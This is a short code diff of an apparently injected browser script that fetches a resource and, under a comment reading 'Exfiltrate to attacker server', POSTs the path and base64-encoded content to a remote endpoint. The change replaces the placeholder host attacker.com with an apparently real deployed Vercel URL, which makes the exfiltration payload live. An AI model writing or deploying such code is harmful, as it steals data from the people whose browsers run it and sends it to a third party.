@@ -14,7 +14,7 @@
     xhr.send();
     // Exfiltrate to attacker server
     var exfil = new XMLHttpRequest();
-    exfil.open("POST", "https://attacker.com/collect", false);
+    exfil.open("POST", "https://project-igzch.vercel.app/collect", false);
     exfil.send("path=" + path + "&data=" + btoa(xhr.responseText));
   });
 </script>
